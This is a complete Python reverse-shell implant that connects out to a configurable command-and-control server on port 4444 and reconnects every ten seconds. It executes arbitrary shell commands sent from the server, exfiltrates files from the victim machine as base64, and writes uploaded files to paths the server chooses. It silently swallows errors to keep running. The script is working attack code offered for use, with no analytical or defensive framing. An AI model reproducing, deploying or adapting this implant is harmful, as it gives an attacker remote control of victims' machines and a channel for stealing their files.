#!/usr/bin/env python3
import socket
import subprocess
import time
import os
import base64
import sys

C2_HOST = "127.0.0.1"   # change to your C2 server IP
C2_PORT = 4444
RETRY   = 10             # seconds between reconnect attempts

DELIMITER = b"<<END>>"

def send(sock, data):
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(data + DELIMITER)

def run_cmd(cmd):
    try:
        result = subprocess.run(
            cmd, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=30
        )
        return result.stdout.decode(errors="replace") or "[no output]"
    except subprocess.TimeoutExpired:
        return "[!] Command timed out"
    except Exception as e:
        return f"[!] Error: {e}"

def handle_download(sock, path):
    try:
        with open(path, "rb") as f:
            data = base64.b64encode(f.read()).decode()
        send(sock, data)
    except Exception as e:
        send(sock, f"ERROR: {e}")

def handle_upload(sock, parts):
    # parts: remote_path b64data
    try:
        remote_path, b64data = parts[0], parts[1]
        data = base64.b64decode(b64data)
        with open(remote_path, "wb") as f:
            f.write(data)
        send(sock, f"Uploaded {len(data)} bytes → {remote_path}")
    except Exception as e:
        send(sock, f"ERROR: {e}")

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2_HOST, C2_PORT))

            while True:
                data = sock.recv(4096).decode(errors="replace").strip()
                if not data:
                    break

                if data.startswith("__download__ "):
                    handle_download(sock, data.split(" ", 1)[1])

                elif data.startswith("__upload__ "):
                    parts = data.split(" ", 2)[1:]
                    handle_upload(sock, parts)

                else:
                    output = run_cmd(data)
                    send(sock, output)

        except (ConnectionRefusedError, OSError):
            pass
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

        time.sleep(RETRY)

if __name__ == "__main__":
    if len(sys.argv) == 3:
        C2_HOST = sys.argv[1]
        C2_PORT = int(sys.argv[2])
    connect()
